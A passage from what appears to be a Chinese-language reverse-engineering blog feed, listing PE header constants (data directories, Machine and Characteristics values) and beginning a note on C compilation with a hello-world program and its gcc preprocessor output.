IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors</span><br><span class="line">#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor</span><br></pre></td></tr></table></figure><h2 id="Machine值"><a href="#Machine值" class="headerlink" title="Machine值"></a>Machine值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#define IMAGE_FILE_MACHINE_UNKNOWN           0</span><br><span class="line">#define IMAGE_FILE_MACHINE_I386              0x014c  // Intel 386.</span><br><span class="line">#define IMAGE_FILE_MACHINE_R3000             0x0162  // MIPS little-endian, 0x160 big-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R4000             0x0166  // MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R10000            0x0168  // MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  // MIPS little-endian WCE v2</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA             0x0184  // Alpha_AXP</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3               0x01a2  // SH3 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3DSP            0x01a3</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3E              0x01a4  // SH3E little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH4               0x01a6  // SH4 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH5               0x01a8  // SH5</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM               0x01c0  // ARM Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_THUMB             0x01c2</span><br><span class="line">#define IMAGE_FILE_MACHINE_AM33              0x01d3</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPC           0x01F0  // IBM PowerPC Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPCFP         0x01f1</span><br><span class="line">#define IMAGE_FILE_MACHINE_IA64              0x0200  // Intel 64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPS16            0x0266  // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA64           0x0284  // ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU           0x0366  // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_TRICORE           0x0520  // Infineon</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEF               0x0CEF</span><br><span class="line">#define IMAGE_FILE_MACHINE_EBC               0x0EBC  // EFI Byte Code</span><br><span class="line">#define IMAGE_FILE_MACHINE_AMD64             0x8664  // AMD64 (K8)</span><br><span class="line">#define IMAGE_FILE_MACHINE_M32R              0x9041  // M32R little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEE               0xC0EE</span><br></pre></td></tr></table></figure><h2 id="Characteristics值"><a href="#Characteristics值" class="headerlink" title="Characteristics值"></a>Characteristics值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from file.</span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no unresolved externel references).</span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.</span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.</span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  // Agressively trim working set</span><br><span class="line">#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  // App can handle &gt;2gb addresses</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are reversed.</span><br><span class="line">#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.</span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file in .DBG file</span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  // If Image is on removable media, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  // If Image is on Net, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_SYSTEM                    0x1000  // System File.</span><br><span class="line">#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.</span><br><span class="line">#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  // File should only be run on a UP machine</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are reversed.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Core Principles of Reverse Engineering --Note1</title>
      <link href="/2023/03/31/Note1/"/>
      <url>/2023/03/31/Note1/</url>
      
        <content type="html"><![CDATA[<ul><li>c编译过程</li><li>常见寄存器</li><li>栈帧</li><li>函数调用约定<span id="more"></span></li></ul><HR color="red"></HR><h2 id="c编译过程"><a href="#c编译过程" class="headerlink" title="c编译过程"></a>c编译过程</h2><p>预处理–&gt;编译–&gt;汇编–&gt;链接</p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;hello&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><ul><li>扩展源文件中所有用到的宏和头文件</li><li>gcc -E -P main.c</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line">typedef long unsigned int size_t;</span><br><span class="line">typedef __builtin_va_list __gnuc_va_list;</span><br><span class="line">typedef unsigned char __u_char;</span><br><span class="line">typedef unsigned short int __u_short;</span><br><span class="line">typedef unsigned int __u_int;</span><br><span class="line">typedef unsigned long int __u_long;</span><br><span class="line">typedef signed char __int8_t;</span><br><span class="line">typedef unsigned char __uint8_t;</span><br><span class="line">typedef signed short int __int16_t;</span><br><span class="line">typedef unsigned short int __uint16_t;</span><br><span class="line">typedef signed int __int32_t;</span><br><span class="line">typedef unsigned int __uint32_t;</span><br><span class="line">typedef signed long int __int64_t;</span><br><span class="line">typedef unsigned long int __uint64_t;</span><br><span class="line">typedef __int8_t __int_least8_t;</span><br><span class="line">typedef __uint8_t __uint_least8_t;</span><br><span class="line">typedef __int16_t __int_least16_t;</span><br><span class="line">typedef __uint16_t __uint_least16_t;</span><br><span class="line">typedef __int32_t __int_least32_t;</span><br><span class="line">typedef __uint32_t __uint_least32_t;</span><br><span class="line">typedef __int64_t __int_least64_t;</span><br><span class="line">typedef __uint64_t __uint_least64_t;</span><br><span class="line">typedef long int __quad_t;</span><br><span class="line">typedef unsigned long int __u_quad_t;</span><br><span class="line">typedef long int __intmax_t;</span><br><span class="line">typedef unsigned long int __uintmax_t;</span><br><span class="line">typedef unsigned long int __dev_t;</span><br><span class="line">typedef unsigned int __uid_t;</span><br><span class="line">typedef unsigned int __gid_t;</span><br><span class="line">typedef unsigned long int __ino_t;</span><br><span class="line">typedef unsigned long int __ino64_t;</span><br><span class="line">typedef unsigned int __mode_t;</span><br><span class="line">typedef unsigned long int __nlink_t;</span><br><span class="line">typedef long int __off_t;</span><br><span class="line">typedef long int __off64_t;</span><br><span class="line">typedef int __pid_t;</span><br><span class="line">typedef struct &#123; int __val[2]; &#125; __fsid_t;</span><br><span class="line">typedef long int __clock_t;</span><br><span class="line">typedef unsigned long int __rlim_t;</span><br><span class="line">typedef unsigned long int __rlim64_t;</span><br><span class="line">typedef unsigned int __id_t;</span><br><span class="line">typedef long int __time_t;</span><br><span class="line">typedef unsigned int __useconds_t;</span><br><span class="line">typedef long int __suseconds_t;</span><br><span class="line">typedef long int __suseconds64_t;</span><br><span class="line">typedef int __daddr_t;</span><br><span class="line">typedef int __key_t;</span><br><span class="line">typedef int __clockid_t;</span><br><span class="line">typedef void * __timer_t;</span><br><span class="line">typedef long int __blksize_t;</span><br><span class="line">typedef long int __blkcnt_t;</span><br><span class="line">typedef long int __blkcnt64_t;</span><br><span class="line">typedef unsigned long int __fsblkcnt_t;</span><br><span class="line">typedef unsigned long int __fsblkcnt64_t;</span><br><span class="line">typedef unsigned long int __fsfilcnt_t;</span><br><span class="line">typedef unsigned long int __fsfilcnt64_t;</span><br><span class="line">typedef long int __fsword_t;</span><br><span class="line">typedef long int __ssize_t;</span><br><span class="line">typedef long int __syscall_slong_t;</span><br><span class="line">typedef unsigned long int __syscall_ulong_t;</span><br><span class="line">typedef __off64_t __loff_t;</span><br><span class="line">typedef char *__caddr_t;</span><br><span class="line">typedef long int __intptr_t;</span><br><span class="line">typedef unsigned int __socklen_t;</span><br><span class="line">typedef int __sig_atomic_t;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  int __count;</span><br><span class="line">  union</span><br><span class="line">  &#123;</span><br><span class="line">    unsigned int __wch;</span><br><span class="line">    char __wchb[4];</span><br><span class="line">  &#125; __value;</span><br><span class="line">&#125; __mbstate_t;</span><br><span class="line">typedef struct _G_fpos_t</span><br><span class="line">&#123;</span><br><span class="line">  __off_t __pos;</span><br><span class="line">  __mbstate_t __state;</span><br><span class="line">&#125; __fpos_t;</span><br><span class="line">typedef struct _G_fpos64_t</span><br><span class="line">&#123;</span><br><span class="line">  __off64_t __pos;</span><br><span class="line">  __mbstate_t __state;</span><br><span class="line">&#125; __fpos64_t;</span><br><span class="line">struct _IO_FILE;</span><br><span class="line">typedef struct _IO_FILE __FILE;</span><br><span class="line">struct _IO_FILE;</span><br><span class="line">typedef struct _IO_FILE FILE;</span><br><span class="line">struct _IO_FILE;</span><br><span class="line">struct _IO_marker;</span><br><span class="line">struct _IO_codecvt;</span><br><span class="line">struct _IO_wide_data;</span><br><span class="line">typedef void _IO_lock_t;</span><br><span class="line">struct _IO_FILE</span><br><span class="line">&#123;</span><br><span class="line">  int _flags;</span><br><span class="line">  char *_IO_read_ptr;</span><br><span class="line">  char *_IO_read_end;</span><br><span class="line">  char *_IO_read_base;</span><br><span class="line">  char *_IO_write_base;</span><br><span class="line">  char *_IO_write_ptr;</span><br><span class="line">  char *_IO_write_end;</span><br><span class="line">  char *_IO_buf_base;</span><br><span class="line">  char *_IO_buf_end;</span><br><span class="line">  char *_IO_save_base;</span><br><span class="line">  char *_IO_backup_base;</span><br><span class="line">  char *_IO_save_end;</span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line">  int _fileno;</span><br><span class="line">  int _flags2;</span><br><span class="line">  __off_t _old_offset;</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">  __off64_t _offset;</span><br><span class="line">  struct _IO_codecvt *_codecvt;</span><br><span class="line">  struct _IO_wide_data *_wide_data;</span><br><span class="line">  struct _IO_FILE *_freeres_list;</span><br><span class="line">  void *_freeres_buf;</span><br><span class="line">  size_t __pad5;</span><br><span class="line">  int _mode;</span><br><span class="line">  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];</span><br><span class="line">&#125;;</span><br><span class="line">typedef __gnuc_va_list va_list;</span><br><span class="line">typedef __off_t off_t;</span><br><span class="line">typedef __ssize_t ssize_t;</span><br><span class="line">typedef __fpos_t fpos_t;</span><br><span class="line">extern FILE *stdin;</span><br><span class="line">extern FILE *stdout;</span><br><span class="line">extern FILE *stderr;</span><br><span class="line">extern int remove (const char *__filename) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int rename (const char *__old, const char *__new) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int renameat (int __oldfd, const char *__old, int __newfd,</span><br><span class="line">       const char *__new) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int fclose (FILE *__stream);</span><br><span class="line">extern FILE *tmpfile (void)</span><br><span class="line">  __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (fclose, 1))) ;</span><br><span class="line">extern char *tmpnam (char[20]) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern char *tmpnam_r (char __s[20]) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern char *tempnam (const char *__dir, const char *__pfx)</span><br><span class="line">   __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (__builtin_free, 1)));</span><br><span class="line">extern int fflush (FILE *__stream);</span><br><span class="line">extern int fflush_unlocked (FILE *__stream);</span><br><span class="line">extern FILE *fopen (const char *__restrict __filename,</span><br><span class="line">      const char *__restrict __modes)</span><br><span class="line">  __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (fclose, 1))) ;</span><br><span class="line">extern FILE *freopen (const char *__restrict __filename,</span><br><span class="line">        const char *__restrict __modes,</span><br><span class="line">        FILE *__restrict __stream) ;</span><br><span class="line">extern FILE *fdopen (int __fd, const char *__modes) __attribute__ ((__nothrow__ , __leaf__))</span><br><span class="line">  __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (fclose, 1))) ;</span><br><span class="line">extern FILE *fmemopen (void *__s, size_t __len, const char *__modes)</span><br><span class="line">  __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (fclose, 1))) ;</span><br><span class="line">extern FILE *open_memstream (char **__bufloc, size_t *__sizeloc) __attribute__ ((__nothrow__ , __leaf__))</span><br><span class="line">  __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (fclose, 1))) ;</span><br><span class="line">extern void setbuf (FILE *__restrict __stream, char *__restrict __buf) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int setvbuf (FILE *__restrict __stream, char *__restrict __buf,</span><br><span class="line">      int __modes, size_t __n) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern void setbuffer (FILE *__restrict __stream, char *__restrict __buf,</span><br><span class="line">         size_t __size) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern void setlinebuf (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int fprintf (FILE *__restrict __stream,</span><br><span class="line">      const char *__restrict __format, ...);</span><br><span class="line">extern int printf (const char *__restrict __format, ...);</span><br><span class="line">extern int sprintf (char *__restrict __s,</span><br><span class="line">      const char *__restrict __format, ...) __attribute__ ((__nothrow__));</span><br><span class="line">extern int vfprintf (FILE *__restrict __s, const char *__restrict __format,</span><br><span class="line">       __gnuc_va_list __arg);</span><br><span class="line">extern int vprintf (const char *__restrict __format, __gnuc_va_list __arg);</span><br><span class="line">extern int vsprintf (char *__restrict __s, const char *__restrict __format,</span><br><span class="line">       __gnuc_va_list __arg) __attribute__ ((__nothrow__));</span><br><span class="line">extern int snprintf (char *__restrict __s, size_t __maxlen,</span><br><span class="line">       const char *__restrict __format, ...)</span><br><span class="line">     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 3, 4)));</span><br><span class="line">extern int vsnprintf (char *__restrict __s, size_t __maxlen,</span><br><span class="line">        const char *__restrict __format, __gnuc_va_list __arg)</span><br><span class="line">     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 3, 0)));</span><br><span class="line">extern int vdprintf (int __fd, const char *__restrict __fmt,</span><br><span class="line">       __gnuc_va_list __arg)</span><br><span class="line">     __attribute__ ((__format__ (__printf__, 2, 0)));</span><br><span class="line">extern int dprintf (int __fd, const char *__restrict __fmt, ...)</span><br><span class="line">     __attribute__ ((__format__ (__printf__, 2, 3)));</span><br><span class="line">extern int fscanf (FILE *__restrict __stream,</span><br><span class="line">     const char *__restrict __format, ...) ;</span><br><span class="line">extern int scanf (const char *__restrict __format, ...) ;</span><br><span class="line">extern int sscanf (const char *__restrict __s,</span><br><span class="line">     const char *__restrict __format, ...) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int fscanf (FILE *__restrict __stream, const char *__restrict __format, ...) __asm__ (&quot;&quot; &quot;__isoc99_fscanf&quot;) ;</span><br><span class="line">extern int scanf (const char *__restrict __format, ...) __asm__ (&quot;&quot; &quot;__isoc99_scanf&quot;) ;</span><br><span class="line">extern int sscanf (const char *__restrict __s, const char *__restrict __format, ...) __asm__ (&quot;&quot; &quot;__isoc99_sscanf&quot;) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int vfscanf (FILE *__restrict __s, const char *__restrict __format,</span><br><span class="line">      __gnuc_va_list __arg)</span><br><span class="line">     __attribute__ ((__format__ (__scanf__, 2, 0))) ;</span><br><span class="line">extern int vscanf (const char *__restrict __format, __gnuc_va_list __arg)</span><br><span class="line">     __attribute__ ((__format__ (__scanf__, 1, 0))) ;</span><br><span class="line">extern int vsscanf (const char *__restrict __s,</span><br><span class="line">      const char *__restrict __format, __gnuc_va_list __arg)</span><br><span class="line">     __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__format__ (__scanf__, 2, 0)));</span><br><span class="line">extern int vfscanf (FILE *__restrict __s, const char *__restrict __format, __gnuc_va_list __arg) __asm__ (&quot;&quot; &quot;__isoc99_vfscanf&quot;)</span><br><span class="line">     __attribute__ ((__format__ (__scanf__, 2, 0))) ;</span><br><span class="line">extern int vscanf (const char *__restrict __format, __gnuc_va_list __arg) __asm__ (&quot;&quot; &quot;__isoc99_vscanf&quot;)</span><br><span class="line">     __attribute__ ((__format__ (__scanf__, 1, 0))) ;</span><br><span class="line">extern int vsscanf (const char *__restrict __s, const char *__restrict __format, __gnuc_va_list __arg) __asm__ (&quot;&quot; &quot;__isoc99_vsscanf&quot;) __attribute__ ((__nothrow__ , __leaf__))</span><br><span class="line">     __attribute__ ((__format__ (__scanf__, 2, 0)));</span><br><span class="line">extern int fgetc (FILE *__stream);</span><br><span class="line">extern int getc (FILE *__stream);</span><br><span class="line">extern int getchar (void);</span><br><span class="line">extern int getc_unlocked (FILE *__stream);</span><br><span class="line">extern int getchar_unlocked (void);</span><br><span class="line">extern int fgetc_unlocked (FILE *__stream);</span><br><span class="line">extern int fputc (int __c, FILE *__stream);</span><br><span class="line">extern int putc (int __c, FILE *__stream);</span><br><span class="line">extern int putchar (int __c);</span><br><span class="line">extern int fputc_unlocked (int __c, FILE *__stream);</span><br><span class="line">extern int putc_unlocked (int __c, FILE *__stream);</span><br><span class="line">extern int putchar_unlocked (int __c);</span><br><span class="line">extern int getw (FILE *__stream);</span><br><span class="line">extern int putw (int __w, FILE *__stream);</span><br><span class="line">extern char *fgets (char *__restrict __s, int __n, FILE *__restrict __stream)</span><br><span class="line">     __attribute__ ((__access__ (__write_only__, 1, 2)));</span><br><span class="line">extern __ssize_t __getdelim (char **__restrict __lineptr,</span><br><span class="line">                             size_t *__restrict __n, int __delimiter,</span><br><span class="line">                             FILE *__restrict __stream) ;</span><br><span class="line">extern __ssize_t getdelim (char **__restrict __lineptr,</span><br><span class="line">                           size_t *__restrict __n, int __delimiter,</span><br><span class="line">                           FILE *__restrict __stream) ;</span><br><span class="line">extern __ssize_t getline (char **__restrict __lineptr,</span><br><span class="line">                          size_t *__restrict __n,</span><br><span class="line">                          FILE *__restrict __stream) ;</span><br><span class="line">extern int fputs (const char *__restrict __s, FILE *__restrict __stream);</span><br><span class="line">extern int puts (const char *__s);</span><br><span class="line">extern int ungetc (int __c, FILE *__stream);</span><br><span class="line">extern size_t fread (void *__restrict __ptr, size_t __size,</span><br><span class="line">       size_t __n, FILE *__restrict __stream) ;</span><br><span class="line">extern size_t fwrite (const void *__restrict __ptr, size_t __size,</span><br><span class="line">        size_t __n, FILE *__restrict __s);</span><br><span class="line">extern size_t fread_unlocked (void *__restrict __ptr, size_t __size,</span><br><span class="line">         size_t __n, FILE *__restrict __stream) ;</span><br><span class="line">extern size_t fwrite_unlocked (const void *__restrict __ptr, size_t __size,</span><br><span class="line">          size_t __n, FILE *__restrict __stream);</span><br><span class="line">extern int fseek (FILE *__stream, long int __off, int __whence);</span><br><span class="line">extern long int ftell (FILE *__stream) ;</span><br><span class="line">extern void rewind (FILE *__stream);</span><br><span class="line">extern int fseeko (FILE *__stream, __off_t __off, int __whence);</span><br><span class="line">extern __off_t ftello (FILE *__stream) ;</span><br><span class="line">extern int fgetpos (FILE *__restrict __stream, fpos_t *__restrict __pos);</span><br><span class="line">extern int fsetpos (FILE *__stream, const fpos_t *__pos);</span><br><span class="line">extern void clearerr (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int feof (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern int ferror (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern void clearerr_unlocked (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int feof_unlocked (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern int ferror_unlocked (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern void perror (const char *__s);</span><br><span class="line">extern int fileno (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern int fileno_unlocked (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern int pclose (FILE *__stream);</span><br><span class="line">extern FILE *popen (const char *__command, const char *__modes)</span><br><span class="line">  __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (pclose, 1))) ;</span><br><span class="line">extern char *ctermid (char *__s) __attribute__ ((__nothrow__ , __leaf__))</span><br><span class="line">  __attribute__ ((__access__ (__write_only__, 